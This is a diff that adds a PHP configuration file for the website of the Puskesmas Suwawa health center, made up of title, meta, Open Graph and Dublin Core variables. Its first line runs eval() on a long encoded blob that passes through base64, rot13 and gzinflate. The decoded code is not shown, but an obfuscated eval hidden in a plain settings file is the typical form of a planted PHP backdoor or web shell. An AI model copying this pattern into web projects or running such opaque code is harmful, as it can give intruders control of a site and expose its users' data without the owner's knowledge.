@@ -1,0 +1,36 @@
+<?php
+eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
+
+
+// TITLE
+$title = "Puskesmas Suwawa";
+
+// META
+$description = "Puskesmas Suwawa";
+$keywords = "Health Center Suwawa, Puskesmas Suwawa";
+$author = "Sri Novita Bumulo";
+$robots = "index,follow";
+$revisitAfter = "revisit-after";
+$MSSmartTagsPreventParsing = "TRUE";
+$Distribution = "Global";
+$Rating = "General";
+$themeColor = "#ffffff";
+
+// OPEN GRAPH DATA
+$ogTitle = "Puskesmas Suwawa";
+$ogType = "website";
+$ogDescription = "Puskesmas Suwawa";
+$ogLocale = "id_ID";
+$ogUrl = "https://health-center-suwawa.delirwan.com";
+$ogSiteName = "Puskesmas Suwawa";
+$ogAdmins = "Sri Novita Bumulo";
+
+// DUBLIN CORE
+$DCTitle = "Puskesmas Suwawa";
+$DCIdentifier = "https://health-center-suwawa.delirwan.com";
+$DCDescription = "Puskesmas Suwawa";
+$DCSubject = "Health Center Suwawa, Puskesmas Suwawa";
+
+// ICONS
+$icon = $url . "assets/img/logo/logo-puskesmas.png";
+$logo = $url . "assets/img/logo/logo-puskesmas.png";
